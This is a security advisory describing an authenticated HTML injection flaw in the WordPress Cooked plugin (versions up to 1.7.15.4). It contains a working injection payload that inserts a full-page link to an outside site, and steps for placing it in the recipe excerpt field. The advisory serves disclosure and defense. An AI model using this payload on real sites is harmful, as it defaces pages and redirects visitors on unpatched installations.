# WordPress Cooked Plugin <= 1.7.15.4 - Authenticated (Contributor+) HTML Injection via Recipe Excerpt

Moderate

[XjSv](/XjSv)
published
GHSA-fx69-f77x-84gr
Jul 17, 2024

## Package

No package listed

## Affected versions

<= 1.7.15.4

## Patched versions

1.8.0

## Description

## Description:

The Cooked plugin for WordPress is vulnerable to HTML Injection in versions up to, and including, 1.7.15.4 due to insufficient input sanitization and output escaping. This vulnerability allows authenticated attackers with contributor-level access and above to inject arbitrary HTML in pages that will be shown whenever a user accesses a compromised page.

## Payload:

```
</textarea></style>'"></textarea></div></div><meta http-equiv="</article></div></section></article><meta http-equiv= /></div></div></div><a href="https://re-alter.ru" target="_blank"><h1 style=background:black;color:pink;font-size:88px;text-align:center;font-family:monospace;line-height:108px;padding:0;margin:0;width:100vw;height:100vh;display:flex;>RE:ALTER</h1></a>

```
## Steps to reproduce:

[0] Install & activate the plugin.

[1] Add a recipe ‘/wp-admin/post-new.php?post\_type=cp\_recipe’.

[2] Use your payload in the Recipe Excerpt (‘\_recipe\_settings[excerpt]’) text area.

[3] Submit the recipe.

[4] Injected payload will be shown on the newly created recipe page and on the general recipe browse page.

## PoC request:

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
